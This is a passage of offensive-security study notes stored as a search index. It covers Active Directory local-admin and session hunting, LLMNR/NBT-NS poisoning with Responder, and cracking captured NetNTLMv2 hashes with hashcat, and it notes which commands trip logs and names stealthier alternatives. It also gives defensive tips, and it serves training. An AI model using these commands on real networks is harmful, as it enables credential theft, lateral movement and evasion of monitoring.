protocols."},{"id":"local-admin-hunting","u":"01_attacks-lateral-movement.html#local-admin-hunting","sec":"Attacks + Lateral Movement","lvl":2,"t":"Local Admin Hunting","c":"Find all machines on the current domain where the current user has local admin access Find-LocalAdminAccess -Verbose • This function queries the DC of the current or provided domain for a list of computers (***Get- NetComputer ) and then use multi-threaded Invoke-CheckLocalAdminAccess*** on each machine. • This can also be done with the help of remote administration tools like WMI and PowerShell remoting. Pretty useful in cases ports (RPC and SMB) used by Find-LocalAdminAccess are blocked. • See Find-WMILocalAdminAccess.ps1 and Find-PSRemotingLocalAdminAccess.ps1 image.png Note:- This command Find-LocalAdminAccess -Verbose is very noisy as they you will run this you leave 4624(logon) and 4634(logoff) security events ids and you will get admin access on any device then you will also leave 4672(admin logon) on machine and login are created on every device which will cause the spike in the logs and it is sufficient to raise the alert"},{"id":"explaination","u":"01_attacks-lateral-movement.html#explaination","sec":"Attacks + Lateral Movement","lvl":3,"t":"Explaination:","c":"The Find-LocalAdminAccess command attempts to connect to each machine in the domain (via SMB , RPC , or admin shares ) to check whether the current user has local administrator access . 🧠 What Happens Internally For each host , it tries to: Authenticate via SMB (to \\\\<hostname>\\C$ ) Access the remote system Check for local admin privileges This activity triggers authentication and logon attempts on every machine it contacts — even if access is denied. 📜 Security Logs Generated (Per Host) Event ID | Description | Trigger | — | — | — | 4624 | Successful Logon | Generated when the user authenticates via SMB/RPC | 4634 | Logoff | Ends the session after check is done | 4672 | Special Privileges Assigned | Logged if the account has admin rights on that machine | 4776 | NTLM Authentication (optional) | Appears if NTLM is used for auth | 5140 | Shared Object Access | Generated if admin shares like C$ are accessed | Safer Alternatives for Stealth (Less Noisy) Technique | Tool | Description | — | — | — | WMI-based access check | Find-WMILocalAdminAccess.ps1 | Uses WMI (DCOM) — still leaves 4624 but quieter | PowerShell Remoting | Find-PSRemotingLocalAdminAccess.ps1 | Uses WinRM; stealthier if WinRM is trusted | Manual/Selective Check | Invoke-CheckLocalAdminAccess | Use on specific high-value targets , not full subnet scan | LSASS dump and token replay | Cobalt Strike, Mimikatz | Use once you get a foothold to pivot silently | BloodHound | SharpHound | Enumerates access paths via LDAP without triggering admin logons | 🧾 Summary ✔️ Yes, Find-LocalAdminAccess -Verbose is very noisy and should be avoided in stealth red team operations . ✔️ It triggers 4624 , 4634 , and 4672 logs for every machine scanned. ✔️ On a large domain, this creates a clear alert signature visible in SIEM and EDR tools . ✔️ Safer alternatives like WMI , PSRemoting , or BloodHound are preferable for stealth. Find computers where a domain admin (or specified user/group) has active sessions: Find-DomainUserLocation -Verbose - helps identify computers where domain administrators (or specified users/groups) have active sessions Find-DomainUserLocation -UserGroupIdentity \"RDPUsers\" • This function queries the DC of the current or provided domain for members of the given group (Domain Admins by default) using Get-DomainGroupMember , gets a list of computers ( Get-DomainComputer ) and list sessions and logged on users ( Get-NetSession/Get-NetLoggedon ) from each machine. Note:- for Server 2019 and onwards, local administrator privileges are required to list sessions. without privilege you will get error message as shown below image.png image.png Find computers where a domain admin session is available and current user has admin access (uses Test-AdminAccess). Find-DomainUserLocation -CheckAccess **Find computers (File Servers and Distributed File servers) where a domain admin session is available.** Find-DomainUserLocation -Stealth Note:- Later it was rediscovered that using tools like Invoke-SessionHunter it is possible to list session on Remote Registry. so this tool will show admin sessions on remote machine even though you dont have local admin priviledge List sessions on remote machines ( https://github.com/Leo4j/Invoke-SessionHunter ) ***Invoke-SessionHunter -FailSafe*** image.png • Above command doesn’t need admin access on remote machines. Uses Remote Registry and queries HKEY_USERS hive. An opsec friendly command would be (avoid connecting to all the target machines by specifying targets) Invoke-SessionHunter -NoPortScan -Targets C:.txt Note:- Above commands will only work if the remote registry is enabled on remote server, however it is remote registry is enabled by default on server, if it is enabled but stopped then querying it will start it again"},{"id":"llmnrnbt-ns-poisoning","u":"01_attacks-lateral-movement.html#llmnrnbt-ns-poisoning","sec":"Attacks + Lateral Movement","lvl":2,"t":"LLMNR/NBT-NS Poisoning","c":""},{"id":"understanding-the-core-concept","u":"01_attacks-lateral-movement.html#understanding-the-core-concept","sec":"Attacks + Lateral Movement","lvl":3,"t":"Understanding The Core Concept","c":""},{"id":"what-is-mdns","u":"01_attacks-lateral-movement.html#what-is-mdns","sec":"Attacks + Lateral Movement","lvl":3,"t":"🎯 What is mDNS?","c":"Definition mDNS = Multicast Domain Name System Allows hosts to resolve names without a DNS server . Instead of: Client → DNS Server → Answer Uses: Client → Multicast Everyone → Owner Replies"},{"id":"why-was-mdns-created","u":"01_attacks-lateral-movement.html#why-was-mdns-created","sec":"Attacks + Lateral Movement","lvl":3,"t":"🎯 Why Was mDNS Created?","c":"Problem Traditional DNS requires: ✔ DNS Server ✔ DNS Records ✔ Infrastructure Example: printer.company.com requires: DNS Server ↓ A Record ↓ IP Address"},{"id":"but-what-about","u":"01_attacks-lateral-movement.html#but-what-about","sec":"Attacks + Lateral Movement","lvl":4,"t":"But What About?","c":"🏠 Home Networks 📺 Smart TVs 🖨 Printers 📱 Phones 🎮 Gaming Consoles 💡 IoT Devices Most don’t have internal DNS infrastructure. Need: Automatic Discovery without configuration."},{"id":"rfc","u":"01_attacks-lateral-movement.html#rfc","sec":"Attacks + Lateral Movement","lvl":4,"t":"🎯 RFC","c":"mDNS: RFC 6762 Often paired with: DNS-SD (Service Discovery) RFC 6763"},{"id":"protocol-details","u":"01_attacks-lateral-movement.html#protocol-details","sec":"Attacks + Lateral Movement","lvl":4,"t":"🎯 Protocol Details","c":"Component | Value | — | — | Protocol | UDP | Port | 5353 | IPv4 Multicast | 224.0.0.251 | IPv6 Multicast | FF02::FB | Scope | Local Subnet | TTL | 255 |"},{"id":"important-concept","u":"01_attacks-lateral-movement.html#important-concept","sec":"Attacks + Lateral Movement","lvl":3,"t":"🎯 Important Concept","c":"mDNS is: ❌ Not Broadcast ✔ Multicast Broadcast Sent to: 255.255.255.255 Everyone receives. Multicast Sent to: 224.0.0.251 Only hosts subscribed to mDNS receive it. Think: Broadcast = Loudspeaker Multicast = Group Chat"},{"id":"key-difference-visualization","u":"01_attacks-lateral-movement.html#key-difference-visualization","sec":"Attacks + Lateral Movement","lvl":3,"t":"Key Difference Visualization","c":"Broadcast (255.255.255.255): Host A → [ALL HOSTS] ← Host B, C, D, E, F... (Everyone gets it) Multicast (224.0.0.1): Host A → [GROUP 224.0.0.1] ← Only subscribed: B, D, F (Only interested hosts)"},{"id":"main-components","u":"01_attacks-lateral-movement.html#main-components","sec":"Attacks + Lateral Movement","lvl":3,"t":"🎯 Main Components","c":"1️⃣ Requesting Host Needs resolution. Example: Windows Laptop wants: printer.local 2️⃣ Multicast Group All mDNS devices join: 224.0.0.251 3️⃣ Target Host Owns: printer.local and listens on: UDP 5353"},{"id":"typical-flow","u":"01_attacks-lateral-movement.html#typical-flow","sec":"Attacks + Lateral Movement","lvl":3,"t":"🎯 Typical Flow","c":"Network: Windows 192.168.1.20 Printer 192.168.1.50 Smart TV 192.168.1.60"},{"id":"why-.local-matters","u":"01_attacks-lateral-movement.html#why-.local-matters","sec":"Attacks + Lateral Movement","lvl":3,"t":"🎯 Why “.local” Matters","c":"mDNS almost always uses: .local Examples: printer.local nas.local raspberrypi.local iphone.local"},{"id":"when-os-sees","u":"01_attacks-lateral-movement.html#when-os-sees","sec":"Attacks + Lateral Movement","lvl":3,"t":"When OS Sees","c":"printer.local It immediately thinks: Use mDNS instead of traditional DNS."},{"id":"what-is-llmnr","u":"01_attacks-lateral-movement.html#what-is-llmnr","sec":"Attacks + Lateral Movement","lvl":3,"t":"What is LLMNR ??","c":"LLMNR (Link-Local Multicast Name Resolution) is a Windows name-resolution fallback. When a machine can’t resolve a hostname using DNS , it asks the local network: “Hey everyone, who is fileserver01 ?” This broadcast behavior is the core weakness. Windows uses: DNS (normal) If DNS fails → LLMNR Sometimes NetBIOS (NBT-NS) as well These protocols are unauthenticated by default."},{"id":"why-llmnr-poisoning-works","u":"01_attacks-lateral-movement.html#why-llmnr-poisoning-works","sec":"Attacks + Lateral Movement","lvl":3,"t":"Why LLMNR Poisoning Works","c":"LLMNR trusts the first response it receives. Attackers on the same network can lie and say: “That name? Yeah that’s me.” Then your machine sends authentication data to the attacker."},{"id":"name-resolution-order-in-windows-ad-environment","u":"01_attacks-lateral-movement.html#name-resolution-order-in-windows-ad-environment","sec":"Attacks + Lateral Movement","lvl":3,"t":"✅ 1. Name Resolution Order in Windows (AD Environment)","c":"When a Windows machine tries to resolve a hostname (e.g., INTERNAL-SERVER ), it follows a strict resolution order: ➤ Step 1 — Check Local Cache Windows checks: ✔ DNS Resolver Cache Use: ipconfig /displaydns If the entry exists → Stops here . ➤ Step 2 — Check the HOSTS file Path: C:\\Windows\\System32\\drivers\\etc\\hosts If hostname matches → Resolved locally . ✔ HOSTS file entries override DNS ✔ Frequently abused during privilege escalation ➤ Step 3 — Send a DNS Query Windows queries the DNS server configured in NIC: Example: Domain joined PC → queries Domain Controller DNS Non-domain PC → queries router or ISP DNS If DNS resolves → Done. If DNS fails , Windows checks additional fallback methods depending on the query type (FQDN or non-FQDN)."},{"id":"summary-of-exact-name-resolution-order","u":"01_attacks-lateral-movement.html#summary-of-exact-name-resolution-order","sec":"Attacks + Lateral Movement","lvl":3,"t":"#️⃣ Summary of Exact Name Resolution Order","c":"Here is Windows name resolution order exactly as implemented: Priority | Method | Used When | Notes | — | — | — | — | 1 | Local cache | Always | Fastest | 2 | HOSTS file | Always | Manual override | 3 | DNS | Always | Primary AD resolver | 4 | LLMNR | If DNS fails | IPv6/IPv4 link-local multicast | 5 | NetBIOS Name Service (NBT-NS) | If LLMNR fails or disabled | Last fallback via broadcast | 6 | WINS | If configured | Rare today | ✔ Yes, LLMNR → NetBIOS → WINS is the fallback chain."},{"id":"llmnr-link-local-multicast-name-resolution","u":"01_attacks-lateral-movement.html#llmnr-link-local-multicast-name-resolution","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔥 2. LLMNR (Link-Local Multicast Name Resolution)","c":"✔ Purpose: A fallback name-resolution protocol used when: DNS fails Query is non-FQDN Host is on the same local subnet ✔ Protocol details: Port 5355 UDP/TCP Works via IPv6 and IPv4 multicast No authentication → easy to spoof This is what tools like Responder exploit. Windows has LLMNR enabled by default unless: Group Policy disables it Security hardening is applied So you do NOT need to enable it . It’s always already running → hence LLMNR poisoning possible ."},{"id":"netbios-name-service-nbt-ns","u":"01_attacks-lateral-movement.html#netbios-name-service-nbt-ns","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔥 3. NetBIOS Name Service (NBT-NS)","c":"If DNS + LLMNR fail , Windows sends a NetBIOS broadcast : ✔ Used on: UDP 137 (NBNS) UDP 138 (Browser) TCP 139 (Session) ✔ Behavior: Entire LAN receives the broadcast Any host can reply ← attacker can spoof response LLMNR → newer NetBIOS → older but still widely enabled Important: ✔ NetBIOS is ENABLED by default on Windows. ✔ Only disabled if: Network Adapter setting “Disable NetBIOS over TCP/IP” is applied GPO overrides it"},{"id":"why-llmnrnetbios-poisoning-works","u":"01_attacks-lateral-movement.html#why-llmnrnetbios-poisoning-works","sec":"Attacks + Lateral Movement","lvl":3,"t":"🧠 4. Why LLMNR/NetBIOS Poisoning Works","c":"Because Windows behavior is: DNS fails for something (typo, missing DFS entry, broken UNC path) Windows tries LLMNR Attacker replies faster than the real host Victim sends NTLM authentication to attacker Attacker captures: NTLMv2 hashes Usernames Sometimes challenge/response → relay to SMB/LDAP Example attack: sudo responder -I eth0 Attacker receives something like: User: CORP\\john.doe Hash: NTLMv2 hash captured"},{"id":"full-example-how-name-resolution-happens","u":"01_attacks-lateral-movement.html#full-example-how-name-resolution-happens","sec":"Attacks + Lateral Movement","lvl":3,"t":"🧭 5. Full Example: How Name Resolution Happens","c":"Suppose a Windows user enters: \\\\fileserver01\\backup ❌ DNS lookup fails Because “fileserver01.corp.local” does not exist. Windows then: Tries LLMNR → Sends multicast query → Attacker replies “I am fileserver01” Victim sends NTLM authentication to attacker If LLMNR disabled → fallback to NetBIOS: Sends NetBIOS broadcast → Attacker fakes response → Victim sends NTLM auth again This is the LLMNR/NetBIOS poisoning attack ."},{"id":"what-responder-does-conceptually-defensive-understanding","u":"01_attacks-lateral-movement.html#what-responder-does-conceptually-defensive-understanding","sec":"Attacks + Lateral Movement","lvl":3,"t":"✅ What Responder Does (Conceptually – defensive understanding)","c":"When LLMNR or NetBIOS sends out: “Who is FILESERV01?” Your attacker tool (like Responder ) pretends to be that server and answers: “That’s me.” The victim machine believes it and tries to connect."},{"id":"what-the-victim-sends","u":"01_attacks-lateral-movement.html#what-the-victim-sends","sec":"Attacks + Lateral Movement","lvl":3,"t":"✅ What the Victim Sends","c":"When the victim connects, Windows automatically attempts authentication using NTLM : DOMAIN\\user NTLMv2 challenge-response hash So yes — the victim tries to authenticate to your fake server."},{"id":"what-the-attacker-gets","u":"01_attacks-lateral-movement.html#what-the-attacker-gets","sec":"Attacks + Lateral Movement","lvl":3,"t":"✅ What the Attacker Gets","c":"You don’t get the password in plain text. You get an NTLMv2 hash , which can be: Cracked offline (brute-force / wordlists) Relayed to real servers (NTLM relay attack) So your statement: “we check the NTLM hash of that user”"},{"id":"how-to-check-llmnrnetbios-status","u":"01_attacks-lateral-movement.html#how-to-check-llmnrnetbios-status","sec":"Attacks + Lateral Movement","lvl":3,"t":"🛡️ 6. How to Check LLMNR/NetBIOS Status","c":"✔ Check LLMNR Get-NetAdapterBinding -ComponentID ms_llmnr ✔ Check NetBIOS Go to: Network Adapter → IPv4 → Advanced → WINS → NetBIOS"},{"id":"why-is-mdns-considered-safer-than-llmnrnbt-ns","u":"01_attacks-lateral-movement.html#why-is-mdns-considered-safer-than-llmnrnbt-ns","sec":"Attacks + Lateral Movement","lvl":3,"t":"Why is mDNS considered safer than LLMNR/NBT-NS?","c":"✔ Uses multicast instead of broadcast. ✔ Primarily designed for local service discovery. ✔ Usually resolves .local devices rather than SMB resources. ✔ Does not commonly trigger automatic NTLM authentication. ✔ Therefore it is far less useful for NTLMv2 hash-capture attacks."},{"id":"final-simplified-flow","u":"01_attacks-lateral-movement.html#final-simplified-flow","sec":"Attacks + Lateral Movement","lvl":3,"t":"📌 Final Simplified Flow","c":"Name Resolution │ ├─ Hosts File ├─ DNS Cache ├─ DNS Server │ └─ DNS Failed │ ├─ LLMNR (UDP 5355) ├─ NetBIOS (UDP 137) └─ mDNS (UDP 5353) ➡️ LLMNR and NetBIOS work automatically — attacker does NOT need to enable anything. ➡️ They act as DNS fallback for non-FQDN queries when DNS fails ."},{"id":"linux","u":"01_attacks-lateral-movement.html#linux","sec":"Attacks + Lateral Movement","lvl":3,"t":"Linux","c":""},{"id":"objective","u":"01_attacks-lateral-movement.html#objective","sec":"Attacks + Lateral Movement","lvl":2,"t":"🔍 Objective","c":"Goal: Capture NetNTLMv2 password hashes by poisoning LLMNR and NBT-NS broadcasts using Responder , to eventually crack them and gain a foothold in the Active Directory domain."},{"id":"overview","u":"01_attacks-lateral-movement.html#overview","sec":"Attacks + Lateral Movement","lvl":2,"t":"🧭 Overview","c":"Protocol | Full Name | Purpose | — | — | — | LLMNR | Link-Local Multicast Name Resolution | Resolves hostnames on local networks if DNS fails | NBT-NS | NetBIOS Name Service | Legacy system for name resolution (pre-DNS) | Both protocols provide fallback mechanisms when traditional DNS resolution fails . They work on local network segments , and are vulnerable to spoofing attacks because any host can respond to the request , even malicious ones."},{"id":"purpose-of-llmnrnbt-ns","u":"01_attacks-lateral-movement.html#purpose-of-llmnrnbt-ns","sec":"Attacks + Lateral Movement","lvl":2,"t":"📦 Purpose of LLMNR/NBT-NS","c":""},{"id":"why-do-these-protocols-exist","u":"01_attacks-lateral-movement.html#why-do-these-protocols-exist","sec":"Attacks + Lateral Movement","lvl":3,"t":"🌐 Why do these protocols exist?","c":"In many enterprise environments, DNS is not always up to date or complete. Users may mistype hostnames. Legacy applications or systems still rely on NetBIOS. LLMNR and NBT-NS act as “Plan B” name resolution methods ."},{"id":"llmnr---link-local-multicast-name-resolution","u":"01_attacks-lateral-movement.html#llmnr---link-local-multicast-name-resolution","sec":"Attacks + Lateral Movement","lvl":2,"t":"🔗 LLMNR - Link-Local Multicast Name Resolution","c":""},{"id":"key-characteristics","u":"01_attacks-lateral-movement.html#key-characteristics","sec":"Attacks + Lateral Movement","lvl":3,"t":"🧩 Key Characteristics:","c":"Feature | Detail | — | — | Port | UDP 5355 | Protocol Base | Similar to DNS | Scope | Only works on local subnet | IPv4/IPv6 | Supports both | Format | Uses multicast address |"},{"id":"llmnr-workflow","u":"01_attacks-lateral-movement.html#llmnr-workflow","sec":"Attacks + Lateral Movement","lvl":3,"t":"📥 LLMNR Workflow:","c":"A system (e.g., victim) tries to access a host: CopyEdit \\\\internalfileserver DNS query is sent → Fails (no entry for internalfileserver ). LLMNR sends a multicast query to IPv4 224.0.0.252 or IPv6 FF02::1:3 on UDP port 5355 : arduino Who has internalfileserver?\" Any machine on the subnet can respond: \"I am internalfileserver – my IP is 10.0.0.100\" Victim believes the response and connects."},{"id":"nbt-ns---netbios-name-service","u":"01_attacks-lateral-movement.html#nbt-ns---netbios-name-service","sec":"Attacks + Lateral Movement","lvl":2,"t":"📛 NBT-NS - NetBIOS Name Service","c":""},{"id":"key-characteristics-1","u":"01_attacks-lateral-movement.html#key-characteristics-1","sec":"Attacks + Lateral Movement","lvl":3,"t":"🧩 Key Characteristics:","c":"Feature | Detail | — | — | Port | UDP 137 | Protocol Base | Pre-DNS, older tech | Scope | Local subnet | Format | NetBIOS naming scheme |"},{"id":"nbt-ns-workflow","u":"01_attacks-lateral-movement.html#nbt-ns-workflow","sec":"Attacks + Lateral Movement","lvl":3,"t":"📥 NBT-NS Workflow:","c":"DNS fails for a NetBIOS-formatted hostname (e.g., \\\\FILESHARE01 ). Client sends NetBIOS Name Query Request via broadcast on UDP port 137. Query is like: \"Is anyone FILESHARE01?\" Any system on the network can reply: \"Yes, I am FILESHARE01. Here's my IP.\" Client connects to the responding host."},{"id":"security-flaw-in-both-protocols","u":"01_attacks-lateral-movement.html#security-flaw-in-both-protocols","sec":"Attacks + Lateral Movement","lvl":2,"t":"🚨 Security Flaw in Both Protocols","c":""},{"id":"whats-the-vulnerability","u":"01_attacks-lateral-movement.html#whats-the-vulnerability","sec":"Attacks + Lateral Movement","lvl":3,"t":"🕳️ What’s the Vulnerability?","c":"No authentication or verification of the responder. Any attacker on the same broadcast domain can spoof a response. Clients blindly trust the first reply they receive. This makes it ideal for Man-in-the-Middle (MITM) attacks."},{"id":"real-world-exploitation-workflow","u":"01_attacks-lateral-movement.html#real-world-exploitation-workflow","sec":"Attacks + Lateral Movement","lvl":2,"t":"🎯 Real-World Exploitation Workflow","c":""},{"id":"llmnrnbt-ns-poisoning-e.g.-with-responder","u":"01_attacks-lateral-movement.html#llmnrnbt-ns-poisoning-e.g.-with-responder","sec":"Attacks + Lateral Movement","lvl":3,"t":"🧪 LLMNR/NBT-NS Poisoning (e.g., with Responder)","c":"Step | Description | — | — | 1️⃣ | Victim tries to access a wrong/missing hostname like \\\\fileshare01 | 2️⃣ | DNS fails, so the system sends out an LLMNR or NBT-NS broadcast | 3️⃣ | Attacker (using Responder ) replies pretending to be that host | 4️⃣ | Victim sends authentication request (usually NetNTLMv2 hash) | 5️⃣ | Attacker captures the hash | 6️⃣ | Hash is cracked offline to reveal plaintext credentials | 7️⃣ | Credentials are used for lateral movement or further attacks |"},{"id":"differences-between-llmnr-nbt-ns","u":"01_attacks-lateral-movement.html#differences-between-llmnr-nbt-ns","sec":"Attacks + Lateral Movement","lvl":2,"t":"🧠 Differences Between LLMNR & NBT-NS","c":"Feature | LLMNR | NBT-NS | — | — | — | Port | UDP 5355 | UDP 137 | Introduced In | Windows Vista / Server 2008+ | Legacy (pre-DNS era) | Naming Format | DNS-style ( host.domain.local ) | NetBIOS-style ( HOSTNAME ) | Response Type | Multicast | Broadcast | Replacement For | DNS fallback | Legacy Windows name resolution | Still Enabled? | Often, yes (default setting) | Yes, especially in old networks |"},{"id":"quick-example-llmnrnbt-ns-poisoning-flow-with-responder","u":"01_attacks-lateral-movement.html#quick-example-llmnrnbt-ns-poisoning-flow-with-responder","sec":"Attacks + Lateral Movement","lvl":2,"t":"🧪 Quick Example – LLMNR/NBT-NS Poisoning Flow (with Responder)","c":""},{"id":"step-1-user-mistypes-a-hostname","u":"01_attacks-lateral-movement.html#step-1-user-mistypes-a-hostname","sec":"Attacks + Lateral Movement","lvl":3,"t":"🖥️ Step 1: User Mistypes a Hostname","c":"User Action: Tries to access a network share: \\\\printer01.inlanefreight.local Mistake: The actual hostname should have been \\\\print01.inlanefreight.local . ⚠️ Since the user typed the wrong hostname, the system cannot resolve it via DNS."},{"id":"step-2-dns-fails-to-resolve","u":"01_attacks-lateral-movement.html#step-2-dns-fails-to-resolve","sec":"Attacks + Lateral Movement","lvl":3,"t":"🌐 Step 2: DNS Fails to Resolve","c":"DNS Query Sent: The OS sends a DNS query for printer01.inlanefreight.local ."},{"id":"dns-server-response","u":"01_attacks-lateral-movement.html#dns-server-response","sec":"Attacks + Lateral Movement","lvl":4,"t":"DNS Server Response:","c":"\"Sorry, I don’t know that hostname.\" (NXDOMAIN) 🧠 Windows, by default, tries fallback name resolution protocols like LLMNR and NBT-NS if DNS fails."},{"id":"step-3-llmnrnbt-ns-broadcast-issued","u":"01_attacks-lateral-movement.html#step-3-llmnrnbt-ns-broadcast-issued","sec":"Attacks + Lateral Movement","lvl":3,"t":"📡 Step 3: LLMNR/NBT-NS Broadcast Issued","c":""},{"id":"client-victim-system-now-sends-a-broadcast","u":"01_attacks-lateral-movement.html#client-victim-system-now-sends-a-broadcast","sec":"Attacks + Lateral Movement","lvl":4,"t":"Client (victim) system now sends a broadcast:","c":"For LLMNR : multicast on UDP port 5355 For NBT-NS : broadcast on UDP port 137 Example LLMNR message: \"Hey, does anyone know where \\\\printer01.inlanefreight.local is?\" These messages go to every host on the local subnet."},{"id":"step-4-attacker-responder-responds","u":"01_attacks-lateral-movement.html#step-4-attacker-responder-responds","sec":"Attacks + Lateral Movement","lvl":3,"t":"👹 Step 4: Attacker (Responder) Responds","c":"Attacker’s Role: A rogue machine on the same network has Responder running ."},{"id":"responders-reaction","u":"01_attacks-lateral-movement.html#responders-reaction","sec":"Attacks + Lateral Movement","lvl":4,"t":"Responder’s Reaction:","c":"\"Yes! I’m \\\\printer01.inlanefreight.local. Here’s my IP: 10.10.10.200\" The victim receives this fake reply and trusts it because the protocol does not verify authenticity . ✅ Poisoning successful: The victim is tricked into connecting to the attacker."},{"id":"step-5-authentication-attempt-sent","u":"01_attacks-lateral-movement.html#step-5-authentication-attempt-sent","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔐 Step 5: Authentication Attempt Sent","c":"The victim initiates an authentication attempt assuming it’s talking to a legitimate resource. Sends NetNTLMv2 hash to attacker over SMB. Contents: Username Domain NetNTLMv2 hash (based on user password) 🧠 The password hash is captured without needing any brute-force login attempts on the victim machine."},{"id":"step-6-use-the-hash","u":"01_attacks-lateral-movement.html#step-6-use-the-hash","sec":"Attacks + Lateral Movement","lvl":3,"t":"🧩 Step 6: Use the Hash","c":"The captured NTLMv2 hash can be used in two major ways:"},{"id":"offline-cracking-using-hashcat-or-john","u":"01_attacks-lateral-movement.html#offline-cracking-using-hashcat-or-john","sec":"Attacks + Lateral Movement","lvl":3,"t":"1. 🧠 Offline Cracking (using Hashcat or John)","c":"Tool: hashcat -m 5600 or john --format=netntlmv2 If cracked → you get the cleartext password ."},{"id":"smb-relay-attack-under-right-conditions","u":"01_attacks-lateral-movement.html#smb-relay-attack-under-right-conditions","sec":"Attacks + Lateral Movement","lvl":3,"t":"2. 🛠️ SMB Relay Attack (under right conditions)","c":"If SMB Signing is not enforced , you can relay the hash to another host: Authenticate as the user Execute commands Potentially gain full access to systems"},{"id":"summary-table","u":"01_attacks-lateral-movement.html#summary-table","sec":"Attacks + Lateral Movement","lvl":2,"t":"🧾 Summary Table","c":"Step | Description | Result | — | — | — | 1️⃣ | User mistypes hostname | DNS lookup fails | 2️⃣ | DNS cannot resolve it | Fallback to LLMNR/NBT-NS | 3️⃣ | Broadcast query sent | Anyone can reply | 4️⃣ | Attacker responds via Responder | Victim trusts attacker | 5️⃣ | Victim sends authentication attempt | NetNTLMv2 hash is captured | 6️⃣ | Hash is cracked or relayed | Attacker gains credentials or system access |"},{"id":"defense-tips","u":"01_attacks-lateral-movement.html#defense-tips","sec":"Attacks + Lateral Movement","lvl":2,"t":"🛡️ Defense Tips","c":"❌ Disable LLMNR/NBT-NS via Group Policy or registry. ✅ Enforce SMB signing to prevent SMB relay. 🔒 Monitor for broadcast spoofing using tools like Zeek, Defender ATP."},{"id":"vulnerability","u":"01_attacks-lateral-movement.html#vulnerability","sec":"Attacks + Lateral Movement","lvl":3,"t":"🚨 Vulnerability:","c":"When these protocols are used, any machine can reply to the query. This lets an attacker impersonate the legitimate system and capture authentication requests ."},{"id":"attack-flow-example","u":"01_attacks-lateral-movement.html#attack-flow-example","sec":"Attacks + Lateral Movement","lvl":2,"t":"🧪 Attack Flow Example","c":"Victim mistypes \\\\printer01.inlanefreight.local . DNS fails, so the machine broadcasts an LLMNR/NBT-NS request. Responder (attacker) responds, claiming to be that host. Victim sends credentials (NetNTLMv2 hash) to attacker. Attacker can crack hash offline or relay it to access services."},{"id":"tools-used","u":"01_attacks-lateral-movement.html#tools-used","sec":"Attacks + Lateral Movement","lvl":2,"t":"🛠️ Tools Used","c":"Tool | Description | — | — | Responder | Primary tool to spoof LLMNR/NBT-NS responses and capture hashes . | Hashcat | Used to crack the captured NTLM hashes offline. | Inveigh | Alternative PowerShell/C# tool for MITM spoofing on Windows. |"},{"id":"responder-options-and-usage","u":"01_attacks-lateral-movement.html#responder-options-and-usage","sec":"Attacks + Lateral Movement","lvl":2,"t":"⚙️ Responder Options and Usage","c":""},{"id":"help-output-summary","u":"01_attacks-lateral-movement.html#help-output-summary","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔧 Help Output (Summary)","c":"bash CopyEdit responder -h Option | Purpose | — | — | -A | Analyze mode (passive listening). | -I | Network interface to use ( ens224 , eth0 , etc.). | -w | Enable WPAD rogue proxy. | -r | Respond to NetBIOS wredir suffix. | -f | Fingerprint host that issued LLMNR/NBT-NS query. | -v | Verbose output. | -P | Force proxy authentication. | -F | Force Basic/NTLM authentication on WPAD. |"},{"id":"basic-active-mode-usage","u":"01_attacks-lateral-movement.html#basic-active-mode-usage","sec":"Attacks + Lateral Movement","lvl":3,"t":"✅ Basic Active Mode Usage","c":"bash CopyEdit sudo responder -I ens224 -wrf I ens224 → Interface to listen on. w → Start rogue WPAD proxy. r → Respond to NetBIOS suffix queries. f → Attempt host fingerprinting."},{"id":"sample-passive-mode-earlier-phase","u":"01_attacks-lateral-movement.html#sample-passive-mode-earlier-phase","sec":"Attacks + Lateral Movement","lvl":3,"t":"🪪 Sample Passive Mode (Earlier Phase)","c":"bash CopyEdit sudo responder -I ens224 -A Listen silently for analysis of LLMNR/NBT-NS broadcasts. No responses sent — good for initial observation ."},{"id":"responder-output-log-files","u":"01_attacks-lateral-movement.html#responder-output-log-files","sec":"Attacks + Lateral Movement","lvl":2,"t":"📁 Responder Output: Log Files","c":"Logs are stored in: /usr/share/responder/logs/ File Name Example | Meaning | — | — | SMB-NTLMv2-SSP-172.16.5.25.txt | NTLMv2 hash over SMB from 172.16.5.25 | HTTP-NTLMv2-172.16.5.200.txt | NTLMv2 hash over HTTP from 172.16.5.200 |"},{"id":"cracking-captured-ntlmv2-hash-with-hashcat","u":"01_attacks-lateral-movement.html#cracking-captured-ntlmv2-hash-with-hashcat","sec":"Attacks + Lateral Movement","lvl":2,"t":"🔓 Cracking Captured NTLMv2 Hash with Hashcat","c":""},{"id":"command","u":"01_attacks-lateral-movement.html#command","sec":"Attacks + Lateral Movement","lvl":3,"t":"🖥️ Command","c":"bash hashcat -m 5600 captured_hash /usr/share/wordlists/rockyou.txt Option | Explanation | — | — | -m 5600 | Hash mode for NetNTLMv2 | captured_hash | The actual hash or hash file | rockyou.txt | Common password wordlist |"},{"id":"sample-ntlmv2-hash-format","u":"01_attacks-lateral-movement.html#sample-ntlmv2-hash-format","sec":"Attacks + Lateral Movement","lvl":3,"t":"🧪 Sample NTLMv2 Hash Format","c":"ruby CopyEdit FOREND::INLANEFREIGHT:4af70a79938ddf8a:0f85ad1e80...:Klmcargo2 FOREND = Username INLANEFREIGHT = Domain Klmcargo2 = Cracked password"},{"id":"sample-output-breakdown","u":"01_attacks-lateral-movement.html#sample-output-breakdown","sec":"Attacks + Lateral Movement","lvl":3,"t":"🧾 Sample Output Breakdown","c":"text CopyEdit Status...........: Cracked Recovered........: 1/1 (100.00%) Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Hash.Name........: NetNTLMv2 Candidates.......: L0VEABLE -> Kittikat 🎯 Meaning: Hash successfully cracked . Password = Klmcargo2 Can now login using these credentials (if user is valid in the domain)."},{"id":"required-open-ports-on-attacker-system-for-responder","u":"01_attacks-lateral-movement.html#required-open-ports-on-attacker-system-for-responder","sec":"Attacks + Lateral Movement","lvl":2,"t":"🧨 Required Open Ports on Attacker System (for Responder)","c":"To fully operate, the following ports should be available: Protocol | Port | — | — | UDP | 53, 137, 138, 1434, 5355, 5353 | TCP | 21, 25, 80, 110, 135, 139, 1433, 3128, 445, 587, 389, 3141 |"},{"id":"use-cases-after-cracking-hashes","u":"01_attacks-lateral-movement.html#use-cases-after-cracking-hashes","sec":"Attacks + Lateral Movement","lvl":2,"t":"🪪 Use Cases After Cracking Hashes","c":"Foothold in domain using cracked user credentials. Lateral movement via: SMB relay Pass-the-Hash (if applicable) Identify if user has privileged access (Admin, Domain Admin, 